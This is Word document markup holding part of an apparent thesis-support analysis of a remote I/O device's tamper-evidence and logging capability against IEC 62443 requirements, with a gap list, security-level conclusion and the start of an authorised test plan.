            <w:r w:rsidRPr="00271C7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53E3B" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>SRIO-3011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14B47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Detect </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>that</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> parameters changed (signature differs)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1C792" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Runtime-generated, </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">not stored </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>remanently</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">; no attribution/time. </w:t>
            </w:r>
            <w:hyperlink r:id="rId55" w:history="1">
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="6F146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BA61A" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>COM Error Log</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>ErrorEvents</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve">, e.g. SCPU </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>timeout</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C7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03871" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>SRIO-10703/10663/6521/10662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230C5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Indirect trace of </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>some</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> logical interventions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60115" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Circular, non-safety, </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>cleared on cold start</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">; no physical-tamper events. </w:t>
            </w:r>
            <w:hyperlink r:id="rId56" w:history="1">
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="1A49F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E2AC7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rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Debug/Test port fused off in production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C1300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SRIO-2580 (dev phase only), SRIO-1526, /fit (P) </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>production_fuse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1A079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Removes an access path to safety software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601A5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  <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Design exclusion → EDR 2.13</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>not</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> an evidence entry — your point is correct. </w:t>
            </w:r>
            <w:hyperlink r:id="rId57" w:history="1">
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[100_SRIO_P...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId58" w:history="1">
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00271C74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23EBA035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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Gap validation — your gap is correct; I am partitioning and hardening it:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="216DCFD2" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-1 (physical tamper — accurate, keep).</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> No tamper switch/sensor → EDR 3.11 </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>detection</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> limb unmet. An intervention avoiding visible seal damage is </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unrecorded and unattributable</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CCA7878" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (time attribution — you missed this; add it).</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Even the events the device </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>does</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> log carry </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no absolute timestamp</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — only uptime that </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>resets on cold start</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. So RQ-003 evidence is not time-referenceable, and a cold start both </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>clears</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>de-times</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the record. This is arguably a </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>worse</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> failure than the missing sensor, because it undermines even the partial logs. </w:t>
      </w:r>
      <w:hyperlink r:id="rId59" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4E7C4A84" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-3 (evidence protection &amp; retention — add).</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The store is </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>non-safety (QM), circular, cold-start-cleared</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → fails CR 2.9/3.9 and cannot be "retained for the mandated period." </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>extends</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>your</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>point</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11438944" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-4 (debug/test port — accurate, keep).</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Fusing is a valid </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EDR 2.13</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> compensating exclusion, but RQ-003 </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>strictly</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requires </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>evidence of any intervention</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; a physical re-probe of the fused interface still yields </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no log entry</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F5AAFA" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL conclusion for the thesis:</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> For the </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>evidence-collection</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> capability against </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>physical</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> interventions the device sits at </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL 0</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (no detection, no attribution, no protected/timed record). Against </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>logical/configuration</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> interventions it reaches only a weak </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL 1-partial</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> via REVISION_COUNTER / I&amp;M4 / Error Log, undermined by the absent RTC and cold-start clearing. </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CR 6.1 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>readability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>the</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>sole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> fully-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>met</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> sub-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>capability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79AD1847" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00000000" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="6759C5E5">
          <v:rect id="_x0000_i1039" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="0089455F" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 2 — Methodological Test Planning</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D36FE71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This requirement is largely about </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>demonstrating the absence/insufficiency of a control</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, so the test design is evidence-of-negative — proving </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no usable record is produced</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74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3405"/>
        <w:gridCol w:w="1944"/>
        <w:gridCol w:w="2209"/>
        <w:gridCol w:w="1191"/>
      </w:tblGrid>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="3E4663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BFFFB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2817BC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237DCB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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74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9DCBF5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 xml:space="preserve">Scientific </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74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A64F8C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SVV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="70F9A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A0DE8" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74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44A02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Enumerate what evidence </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>does</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> exist: read COM Error Log via IoT-Core; confirm I&amp;M0 REVISION_COUNTER increments on a parameter change; read I&amp;M4 signature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80891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Functional baseline of the </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>partial</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> controls (CR 6.1 met; CR 2.8 partial)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D7458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Requirements-based verification; NIST SP 800-115 §3.2 (log review)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553B8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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="182A55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88406" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74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DA915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Perform a </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>legitimate</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>authorised</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> address/parameter </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>change + reboot; check whether any retained, time-stamped evidence is generated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C485E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lastRenderedPageBreak/>
